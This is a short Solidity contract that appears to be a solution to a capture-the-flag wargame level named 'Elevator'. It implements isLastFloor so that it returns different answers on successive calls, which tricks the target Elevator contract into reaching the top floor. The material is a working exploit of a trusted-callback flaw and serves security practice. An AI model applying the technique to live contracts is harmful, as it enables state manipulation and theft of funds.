// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "instances/11_elevator.sol";

contract AttackerElevator {
    uint256 topFloor;

    function isLastFloor(uint256 floor) external returns (bool last) {
        last = floor == topFloor;

        topFloor = floor;
    }

    function exploit(address elevator) public payable {
        Elevator(elevator).goTo(3);
    }
}
